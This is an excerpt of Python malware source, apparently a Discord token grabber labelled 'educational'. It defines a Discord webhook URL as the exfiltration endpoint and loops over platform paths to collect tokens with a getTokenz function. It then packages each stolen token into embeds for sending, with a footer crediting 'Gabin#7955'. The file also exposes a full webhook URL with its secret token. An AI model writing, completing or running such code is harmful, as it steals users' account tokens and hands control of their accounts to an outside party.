...
WEBHOOK_URL = "https://discord.com/api/webhooks/1346791964867297290/iPGkgQF7qvbCjGf69MHBtDUu7av84qmOpM6Qqb2dridqxHBNITXcTD5q47LYk9TRugUf" # WebHook ICI
    ...
    for platform, path in PATHS.items():
        ...
        for token in getTokenz(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": "➡️ Token Grab Educatif par Gabin#7955"
                }
            }
            embeds.append(embed)
